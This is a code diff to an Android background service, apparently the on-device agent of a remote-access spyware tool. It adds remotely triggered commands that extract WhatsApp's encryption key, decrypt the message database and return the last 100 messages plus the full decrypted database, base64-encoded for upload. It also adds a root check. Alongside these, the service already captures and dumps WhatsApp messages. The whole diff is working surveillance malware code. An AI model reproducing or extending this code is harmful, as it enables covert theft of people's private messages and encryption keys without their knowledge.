@@ -418,6 +418,15 @@ public class AgentService extends Service {
             
                 case "WA_CAPTURE_DUMP":
                     return dumpWhatsAppMessages();
+                // ============ WHATSAPP DECRYPT COMMANDS ============
+                case "WA_BACKUP_INFO":
+                    return getWhatsAppBackupInfo();
+    
+                case "WA_EXTRACT_KEY":
+                    return extractWhatsAppKey();
+    
+                case "WA_DECRYPT_DB":
+                    return decryptWhatsAppDatabase();  
             
                 case "WA_CAPTURE_STATS":
                     return getWhatsAppStats();
@@ -1980,6 +1989,9 @@ private String getWhatsAppStats() {
                 "WA_CAPTURE_DUMP - Get captured WhatsApp messages",
                 "WA_CAPTURE_STATS - Get capture statistics",
                 "WA_CAPTURE_CLEAR - Clear captured messages",
+                "WA_BACKUP_INFO - Get Backup Key whatsapp",
+                "WA_EXTRACT_KEY - Get Key Whatsapp",
+                "WA_DECRYPT_DB - Get Decrypt key whatsapp"
             };
             for (String cmd : cmdList) {
                 commands.put(cmd);
@@ -2065,6 +2077,159 @@ private String getWhatsAppStats() {
         }
         return "Unknown";
     }
+
+    // ==================== WHATSAPP DECRYPT ====================
+
+private String getWhatsAppBackupInfo() {
+    try {
+        WhatsAppBackupHelper helper = new WhatsAppBackupHelper(this, false);
+        String info = helper.getWhatsAppInfo();
+        
+        // Tambahkan info tentang database terbaru
+        String latestDb = helper.getLatestDatabaseFile();
+        
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("type", "whatsapp_backup_info");
+        result.put("info", new JSONObject(info));
+        result.put("latest_database", latestDb != null ? latestDb : "Not found");
+        result.put("backup_script", helper.createBackupScript());
+        result.put("is_rooted", checkRoot());
+        
+        return result.toString();
+        
+    } catch (Exception e) {
+        return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+    }
+}
+
+private String extractWhatsAppKey() {
+    try {
+        WhatsAppBackupHelper helper = new WhatsAppBackupHelper(this, false);
+        
+        // Coba ambil key
+        byte[] keyData = helper.getKeyFile();
+        
+        if (keyData != null) {
+            // Key ditemukan, cache
+            helper.cacheKey(keyData);
+            
+            JSONObject result = new JSONObject();
+            result.put("status", "success");
+            result.put("message", "Key extracted and cached");
+            result.put("key_size", keyData.length);
+            result.put("key_base64", Base64.encodeToString(keyData, Base64.NO_WRAP));
+            return result.toString();
+        } else {
+            // Key tidak ditemukan, berikan petunjuk
+            JSONObject result = new JSONObject();
+            result.put("status", "requires_action");
+            result.put("message", "Key not found. Please run backup script on PC");
+            result.put("script", helper.createBackupScript());
+            return result.toString();
+        }
+        
+    } catch (Exception e) {
+        return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+    }
+}
+
+private String decryptWhatsAppDatabase() {
+    try {
+        WhatsAppBackupHelper helper = new WhatsAppBackupHelper(this, false);
+        
+        // Dapatkan path database terbaru
+        String dbPath = helper.getLatestDatabaseFile();
+        if (dbPath == null) {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "Database file not found");
+            return result.toString();
+        }
+        
+        // Coba dekripsi dengan cached key
+        File outputFile = new File(getCacheDir(), "whatsapp_decrypted.db");
+        boolean success = WhatsAppDecryptHelper.decryptWithCachedKey(
+            this, dbPath, outputFile.getAbsolutePath()
+        );
+        
+        if (success) {
+            // Baca isi database (contoh: ambil 100 pesan terakhir)
+            String messages = readWhatsAppMessages(outputFile.getAbsolutePath());
+            
+            // Upload file decrypted
+            String encoded = Base64.encodeToString(
+                Files.readAllBytes(outputFile.toPath()), 
+                Base64.NO_WRAP
+            );
+            
+            JSONObject result = new JSONObject();
+            result.put("status", "success");
+            result.put("type", "whatsapp_decrypted");
+            result.put("database_path", dbPath);
+            result.put("decrypted_path", outputFile.getAbsolutePath());
+            result.put("decrypted_data", encoded);
+            result.put("messages_preview", messages);
+            return result.toString();
+            
+        } else {
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "Decryption failed. Please extract key first");
+            result.put("next_step", "Run WA_EXTRACT_KEY first");
+            return result.toString();
+        }
+        
+    } catch (Exception e) {
+        return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+    }
+}
+
+private String readWhatsAppMessages(String dbPath) {
+    try {
+        // Baca database SQLite
+        Class.forName("org.sqlite.JDBC");
+        java.sql.Connection conn = java.sql.DriverManager.getConnection("jdbc:sqlite:" + dbPath);
+        java.sql.Statement stmt = conn.createStatement();
+        
+        // Query untuk mendapatkan pesan terakhir
+        String query = "SELECT message_id, timestamp, sender_name, data FROM messages " +
+                       "ORDER BY timestamp DESC LIMIT 100";
+        java.sql.ResultSet rs = stmt.executeQuery(query);
+        
+        StringBuilder messages = new StringBuilder();
+        while (rs.next()) {
+            String sender = rs.getString("sender_name");
+            String message = rs.getString("data");
+            String timestamp = rs.getString("timestamp");
+            messages.append("[").append(timestamp).append("] ")
+                    .append(sender).append(": ").append(message).append("\n");
+        }
+        
+        rs.close();
+        stmt.close();
+        conn.close();
+        
+        return messages.toString();
+        
+    } catch (Exception e) {
+        Log.e(TAG, "Read messages error: " + e.getMessage());
+        return "Error reading messages: " + e.getMessage();
+    }
+}
+
+private boolean checkRoot() {
+    try {
+        File file = new File("/system/app/Superuser.apk");
+        if (file.exists()) return true;
+        Process process = Runtime.getRuntime().exec("which su");
+        BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        if (in.readLine() != null) return true;
+    } catch (Exception e) {
+        return false;
+    }
+    return false;
+}
 
     private String formatFileSize(long size) {
         if (size <= 0) return "0 B";
